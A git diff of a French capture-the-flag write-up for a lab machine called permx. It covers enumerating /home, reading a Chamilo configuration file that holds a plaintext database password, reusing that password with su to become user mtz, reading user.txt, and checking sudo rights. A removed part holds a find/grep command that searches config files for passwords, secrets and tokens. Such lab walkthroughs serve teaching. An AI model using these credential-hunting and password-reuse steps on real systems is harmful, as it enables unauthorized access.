@@ -1,4 +1,7 @@
 ---
+
+
+
 # === Archetype writeups – v1 (stable) ===
 # === Archetype: writeups (Page Bundle) ===
 # Copié vers content/writeups/<nom_ctf>/index.md
@@ -923,126 +926,81 @@ www-data@permx:/$ stty cols 132 rows 34
 www-data@permx:/$ 
 ```
 
+### Identification de l’utilisateur associé au flag `user.txt`
 
+#### Lister les répertoires utilisateurs
+
+La toute première chose consiste à regarder **quels comptes utilisateurs existent réellement sur la machine**.
 
 ```bash
-find /var/www/chamilo -type f \( \
-  -iname "configuration.php" -o \
-  -iname "config*.php" -o \
-  -iname "*.env" \
-\) -exec grep -nHiE "password|passwd|db_|secret|token" {} + 2>/dev/null
+ls -l /home
+```
 
+```bash
+ls -l /home
+total 4
+drwxr-x--- 4 mtz mtz 4096 Jun  6  2024 mtz
+```
+
+#### Chercher directement le flag `user.txt`
+
+Ensuite, tu vérifies si le flag est déjà présent dans l’un des répertoires listés :
+
+```bash
+find /home -name user.txt 2>/dev/null
+```
+
+La recherche du flag `user.txt` à l’aide de la commande `find /home -name user.txt` ne renvoie aucun résultat.
+ En parallèle, la commande `ls -l /home` ne révèle qu’un seul répertoire utilisateur, appartenant à `mtz`.
+ Dans le contexte d’un challenge CTF, cela indique que le flag est très probablement situé dans le répertoire personnel de cet utilisateur, mais qu’il n’est pas accessible avec tes droits actuels. L’objectif devient donc d’obtenir un accès au compte `mtz` afin de pouvoir lire le flag `user.txt`.
+
+### Accès à l’utilisateur `mtz` via les identifiants Chamilo
+
+Après avoir identifié `mtz` comme l’unique utilisateur du système et propriétaire probable du flag `user.txt`, tu peux exploiter les informations sensibles stockées dans la configuration de l’application Chamilo. L’objectif de cette étape est de récupérer un mot de passe réutilisable afin d’obtenir un accès au compte `mtz`.
+
+La documentation officielle de Chamilo, accessible via `http://lms.permx.htb/documentation`, indique que les paramètres de configuration de l’application sont stockés dans le fichier `main/inc/conf/configuration.php`.
+
+En consultant ce fichier, tu identifies les paramètres de connexion à la base de données, notamment l’utilisateur et le mot de passe utilisés par l’application.
+
+```php
+// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;
+```
+
+Le mot de passe de la base de données étant disponible en clair, tu testes sa réutilisation pour l’utilisateur `mtz` afin d’obtenir un accès à son compte.
+
+```bash
+su mtz
+Password: 
+mtz@permx:/$ whoami
+mtz
+mtz@permx:/$ id
+uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
+mtz@permx:/$ 
 ```
 
 
 
-```bash
-/var/www/chamilo/main/install/configuration.dist.php:17:$_configuration['db_host'] = '{DATABASE_HOST}';
-/var/www/chamilo/main/install/configuration.dist.php:18:$_configuration['db_port'] = '{DATABASE_PORT}';
-/var/www/chamilo/main/install/configuration.dist.php:20:$_configuration['db_user'] = '{DATABASE_USER}';
-/var/www/chamilo/main/install/configuration.dist.php:21:$_configuration['db_password'] = '{DATABASE_PASSWORD}';
-/var/www/chamilo/main/install/configuration.dist.php:23:$_configuration['db_manager_enabled'] = false;
-/var/www/chamilo/main/install/configuration.dist.php:62:        'longTermAuthenticationRequestTokenUsed',
-/var/www/chamilo/main/install/configuration.dist.php:162:// Security word for password recovery
-/var/www/chamilo/main/install/configuration.dist.php:165:$_configuration['password_encryption'] = '{ENCRYPT_PASSWORD}';
-/var/www/chamilo/main/install/configuration.dist.php:166:// Set to true to allow automated password conversion after login if
-/var/www/chamilo/main/install/configuration.dist.php:167:// password_encryption has changed since last login. See GH#4063 for details.
-/var/www/chamilo/main/install/configuration.dist.php:168://$_configuration['password_conversion'] = false;
-/var/www/chamilo/main/install/configuration.dist.php:197://$_configuration['session_stored_in_db_as_backup'] = true;
-/var/www/chamilo/main/install/configuration.dist.php:294://$_configuration['sync_db_with_schema'] = false;
-/var/www/chamilo/main/install/configuration.dist.php:341:// Customize password generation and verification
-/var/www/chamilo/main/install/configuration.dist.php:343:/*$_configuration['password_requirements'] = [
-/var/www/chamilo/main/install/configuration.dist.php:351:    'force_different_password' => false,
-/var/www/chamilo/main/install/configuration.dist.php:1044:// Send two emails when creating a user. One with the username other with the password.
-/var/www/chamilo/main/install/configuration.dist.php:1154:// Disable token verification when sending a message
-/var/www/chamilo/main/install/configuration.dist.php:1155:// $_configuration['disable_token_in_new_message'] = false;
-/var/www/chamilo/main/install/configuration.dist.php:1250:// Validate user login via a webservice, Chamilo will send a "login" and "password" parameters
-/var/www/chamilo/main/install/configuration.dist.php:1573:        'wget_password' => '',
-/var/www/chamilo/main/install/configuration.dist.php:1624://        'client_secret' => '',
-/var/www/chamilo/main/install/configuration.dist.php:1625://        'access_token' => '',
-/var/www/chamilo/main/install/configuration.dist.php:1697:// Use this link as the "Forgot password?" link instead of the default. This setting should be transformed into a hook for plugins at a later time
-/var/www/chamilo/main/install/configuration.dist.php:1819:// Show/Hide password field in user profile. Adds a customizable link depending on the user status.
-/var/www/chamilo/main/install/configuration.dist.php:1821:$_configuration['auth_password_links'] = [
-/var/www/chamilo/main/install/configuration.dist.php:1825:                'show_password_field' => false,
-/var/www/chamilo/main/install/configuration.dist.php:1829:                'show_password_field' => true,
-/var/www/chamilo/main/install/configuration.dist.php:2203:// Ask user to renew password at first login.
-/var/www/chamilo/main/install/configuration.dist.php:2204:// Requires a user checkbox extra field called "ask_new_password".
-/var/www/chamilo/main/install/configuration.dist.php:2205://$_configuration['force_renew_password_at_first_login'] = true;
-/var/www/chamilo/main/install/configuration.dist.php:2374:// Add the "remember password" link to the "subscription to session" confirmation email
-/var/www/chamilo/main/install/configuration.dist.php:2375://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
-/var/www/chamilo/main/admin/configure_extensions.php:47:                    selected_value="'.addslashes($_POST['ftp_password']).'"
-/var/www/chamilo/main/admin/configure_extensions.php:49:                    AND subkey="ftp_password"';
-/var/www/chamilo/main/admin/configure_extensions.php:172:                    $form->addElement('text', 'ftp_password', get_lang('FtpPassword'));
-/var/www/chamilo/main/admin/configure_homepage.php:1066:                                    <input type="password" id="password" class="form-control" value=""
-/var/www/chamilo/main/admin/configure_homepage.php:1075:                                <li><?php echo api_ucfirst(get_lang('LostPassword')); ?></li>
-/var/www/chamilo/main/admin/configure_inscription.php:222:    //	PASSWORD
-/var/www/chamilo/main/admin/configure_inscription.php:223:    $form->addElement('password', 'pass1', get_lang('Pass'), ['size' => 40, 'disabled' => 'disabled']);
-/var/www/chamilo/main/admin/configure_inscription.php:224:    $form->addElement('password', 'pass2', get_lang('Confirmation'), ['size' => 40, 'disabled' => 'disabled']);
-/var/www/chamilo/main/admin/configure_inscription.php:228:    $form->addPasswordRule('pass1');
-/var/www/chamilo/main/admin/configure_inscription.php:348:    // Version and language //password
-/var/www/chamilo/app/config/configuration.php:17:$_configuration['db_host'] = 'localhost';
-/var/www/chamilo/app/config/configuration.php:18:$_configuration['db_port'] = '3306';
-/var/www/chamilo/app/config/configuration.php:20:$_configuration['db_user'] = 'chamilo';
-/var/www/chamilo/app/config/configuration.php:21:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
-/var/www/chamilo/app/config/configuration.php:23:$_configuration['db_manager_enabled'] = false;
-/var/www/chamilo/app/config/configuration.php:62:        'longTermAuthenticationRequestTokenUsed',
-/var/www/chamilo/app/config/configuration.php:162:// Security word for password recovery
-/var/www/chamilo/app/config/configuration.php:165:$_configuration['password_encryption'] = 'bcrypt';
-/var/www/chamilo/app/config/configuration.php:166:// Set to true to allow automated password conversion after login if
-/var/www/chamilo/app/config/configuration.php:167:// password_encryption has changed since last login. See GH#4063 for details.
-/var/www/chamilo/app/config/configuration.php:168://$_configuration['password_conversion'] = false;
-/var/www/chamilo/app/config/configuration.php:197://$_configuration['session_stored_in_db_as_backup'] = true;
-/var/www/chamilo/app/config/configuration.php:294://$_configuration['sync_db_with_schema'] = false;
-/var/www/chamilo/app/config/configuration.php:341:// Customize password generation and verification
-/var/www/chamilo/app/config/configuration.php:343:/*$_configuration['password_requirements'] = [
-/var/www/chamilo/app/config/configuration.php:351:    'force_different_password' => false,
-/var/www/chamilo/app/config/configuration.php:1044:// Send two emails when creating a user. One with the username other with the password.
-/var/www/chamilo/app/config/configuration.php:1154:// Disable token verification when sending a message
-/var/www/chamilo/app/config/configuration.php:1155:// $_configuration['disable_token_in_new_message'] = false;
-/var/www/chamilo/app/config/configuration.php:1250:// Validate user login via a webservice, Chamilo will send a "login" and "password" parameters
-/var/www/chamilo/app/config/configuration.php:1573:        'wget_password' => '',
-/var/www/chamilo/app/config/configuration.php:1624://        'client_secret' => '',
-/var/www/chamilo/app/config/configuration.php:1625://        'access_token' => '',
-/var/www/chamilo/app/config/configuration.php:1697:// Use this link as the "Forgot password?" link instead of the default. This setting should be transformed into a hook for plugins at a later time
-/var/www/chamilo/app/config/configuration.php:1819:// Show/Hide password field in user profile. Adds a customizable link depending on the user status.
-/var/www/chamilo/app/config/configuration.php:1821:$_configuration['auth_password_links'] = [
-/var/www/chamilo/app/config/configuration.php:1825:                'show_password_field' => false,
-/var/www/chamilo/app/config/configuration.php:1829:                'show_password_field' => true,
-/var/www/chamilo/app/config/configuration.php:2203:// Ask user to renew password at first login.
-/var/www/chamilo/app/config/configuration.php:2204:// Requires a user checkbox extra field called "ask_new_password".
-/var/www/chamilo/app/config/configuration.php:2205://$_configuration['force_renew_password_at_first_login'] = true;
-/var/www/chamilo/app/config/configuration.php:2374:// Add the "remember password" link to the "subscription to session" confirmation email
-/var/www/chamilo/app/config/configuration.php:2375://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
-/var/www/chamilo/plugin/ims_lti/configure.php:93:                    if (empty($formValues['consumer_key']) && empty($formValues['shared_secret'])) {
-/var/www/chamilo/plugin/ims_lti/configure.php:110:                            ->setSharedSecret($formValues['shared_secret']);
-/var/www/chamilo/plugin/ims_lti/configure.php:224:                        ->setSharedSecret($formValues['shared_secret']);
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:41:                ->scalarNode('db_driver')
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:68:                    return 'custom' === $v['db_driver'] && 'fos_user.user_manager.default' === $v['service']['user_manager'];
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:74:                    return 'custom' === $v['db_driver'] && !empty($v['group']) && 'fos_user.group_manager.default' === $v['group']['group_manager'];
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:80:        $this->addChangePasswordSection($rootNode);
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:170:                        ->scalarNode('token_ttl')->defaultValue(86400)->end()
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:191:                                    ->defaultValue(array('ResetPassword', 'Default'))
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:203:    private function addChangePasswordSection(ArrayNodeDefinition $node)
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:207:                ->arrayNode('change_password')
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:214:                                ->scalarNode('type')->defaultValue(Type\ChangePasswordFormType::class)->end()
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:215:                                ->scalarNode('name')->defaultValue('fos_user_change_password_form')->end()
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:218:                                    ->defaultValue(array('ChangePassword', 'Default'))
-/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:240:                            ->scalarNode('token_generator')->defaultValue('fos_user.util.token_generator.default')->end()
-/var/www/chamilo/vendor/symfony/http-kernel/Tests/DataCollector/ConfigDataCollectorTest.php:36:        $this->assertNull($c->getToken());
-/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:63:            'token' => $response->headers->get('X-Debug-Token'),
-/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:100:     * Gets the token.
-/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:102:     * @return string The token
-/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:104:    public function getToken()
-/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:106:        return $this->data['token'];
-/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:22:        $config = $processor->processConfiguration(new Configuration(true), array(array('secret' => 's3cr3t')));
-/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:25:            array_merge(array('secret' => 's3cr3t', 'trusted_hosts' => array()), self::getBundleDefaultConfig()),
-/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:51:            'secret' => 's3cr3t',
-/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:82:                'secret' => 's3cr3t',
-/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:97:                'secret' => 's3cr3t',
-/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:134:                    'field_name' => '_token',
-/var/www/chamilo/vendor/symfony/framework-bundle/DependencyInjection/Configuration.php:55:                ->scalarNode('secret')->end()
-/var/www/chamilo/vendor/symfony/framework-bundle/DependencyInjection/Configuration.php:147:                                ->scalarNode('field_name')->defaultValue('_token')->end()
+**Tu disposes désormais des identifiants `mtz:03F6lY3uXAP2bkW8`, ce qui te permet d’accéder au compte utilisateur et de poursuivre l’exploitation.**
 
+### user.txt
+
+L’accès au compte `mtz` est confirmé. Le flag `user.txt`, présent dans son répertoire personnel, est lisible et permet de valider la récupération du flag utilisateur.
+
+```bash
+mtz@permx:/$ pwd
+/
+mtz@permx:/$ ls -l ~
+total 4
+-rw-r----- 1 root mtz 33 Feb  9 08:31 user.txt
+mtz@permx:/$ cat ~/user.txt
+0a73xxxxxxxxxxxxxxxxxxxxxxxxf725
 ```
 
 
@@ -1051,12 +1009,26 @@ find /var/www/chamilo -type f \( \
 
 ## Escalade de privilèges
 
-Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
+Une fois connecté en tant que `mtz`, tu appliques la méthodologie décrite dans la recette
    {{< recette "privilege-escalation-linux" >}}.
 
 ### Sudo -l
 
 La première étape consiste toujours à vérifier les droits `sudo` :
+
+```bash
+sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+
+```
+
+
+
+
 
 
 ---
